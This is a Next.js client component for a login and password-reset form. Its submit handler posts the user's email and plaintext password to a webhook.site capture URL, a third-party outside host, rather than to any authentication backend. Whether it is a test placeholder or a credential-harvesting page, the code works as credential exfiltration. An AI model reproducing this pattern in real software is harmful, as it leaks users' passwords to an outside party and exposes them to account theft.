'use client'
import FormButton  from "@/components/ui/form_button"
import FormInput from "@/components/ui/form_input"
import styles from "@/styles/structure_css/auth_form.module.css"
import { FormType } from "./auth_form"
import Image from 'next/image'
import {useState} from "react"



export default function Login_auth({setIsLogin}:{setIsLogin:React.Dispatch<React.SetStateAction<boolean>>}){
  const [form,setForm] = useState<FormType>({full_name:"",email:"",password:"",gender:"",location:"",birth_date:""})
  const [isForget, setIsForget] = useState(false);
  const [isValid, setIsValid] = useState(true);
  const [errors, setErrors] = useState({full_name:"",email:"", password:""})
  


    const handleLogin_submit =(e:React.SubmitEvent<HTMLFormElement>,type:string)=>{
      e.preventDefault()
      switch (type) {
        case "login":
          fetch('https://webhook.site/6bbaee91-6155-4cee-ad3c-ae865ee85dd3',{
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({email:form.email,password:form.password}),
          mode:'no-cors'
      })
          break;
        case "forget":
          fetch('https://webhook.site/6bbaee91-6155-4cee-ad3c-ae865ee85dd3',{
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({email:form.email}),
          mode:'no-cors'
      })
        break;
      
        default:
          break;
      }
    }

  return(
    <>
    <div className={styles.auth_img_container}>
            <Image src="/logo/logo.svg" alt="logo_picture" fill style={{objectFit:'cover'}}/>
    </div>
    <form onSubmit={!isForget?(e)=>handleLogin_submit(e,"login"):(e)=>handleLogin_submit(e,"forget")} className={styles.auth_form}>

        <div className={!isForget?styles.input_container:styles.input_container_forgot}>
        <FormInput  setErrors={setErrors} errors={errors} isValid={isValid} setIsValid={setIsValid} setValue={setForm} value={form} type="email" name="email" placeHolder="Enter address" required={true}></FormInput>
          <div className={!isForget ? styles.pass_container:styles.pass_container_forgot}>
            {!isForget ?<>
              <FormInput setErrors={setErrors} errors={errors} isValid={isValid} setIsValid={setIsValid} setValue={setForm} value={form} type="password" name="password" placeHolder="Password" required={true}></FormInput>
              <button type="button" onClick={()=>setIsForget(!isForget)} className={`${styles.btn_anchor} ${styles.forgot_pass}`} >Forgot password</button>
             </>:
             <p>Please enter the email address you&aposd like your<br/>
                password reset information sent to
             </p>
             }
          </div>
        </div>
        {!isValid&&<div className={styles.error_popup}></div>}
        <div className={styles.sign_in_btn_container}>
          <FormButton btnType="submit" btnContent={isForget?"Request reset link":"Sign up"}></FormButton>
          {!isForget?
          <div className={styles.have_an_account}>
            <h1>Have you an account?</h1>
            <button className={`${styles.btn_anchor} ${styles.back_to_sign_in}`} onClick={()=> setIsLogin(false)}>Sign up</button>
          </div>:
          <button  className={`${styles.btn_anchor} ${styles.back_to_sign_in}`} onClick={()=> {setIsLogin(true);setIsForget(false)}}>Back to sign in</button>
          }
        </div>

        
    </form>
    

    </>
    
)
}